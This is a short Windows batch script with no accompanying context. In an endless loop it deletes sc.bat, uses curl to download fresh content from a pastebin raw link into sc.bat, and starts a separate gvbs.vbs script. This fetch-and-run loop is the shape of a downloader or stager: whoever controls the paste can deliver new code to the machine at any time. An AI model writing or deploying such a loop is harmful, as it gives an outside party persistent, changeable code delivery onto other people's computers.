@echo off
:a
del sc.bat /a /q
timeout /t 2 /nobreak >nul
curl https://pastebin.com/raw/2u4QP3DZ>sc.bat
timeout /t 2 /nobreak >nul
start gvbs.vbs
timeout /t 9 /nobreak >nul
goto a
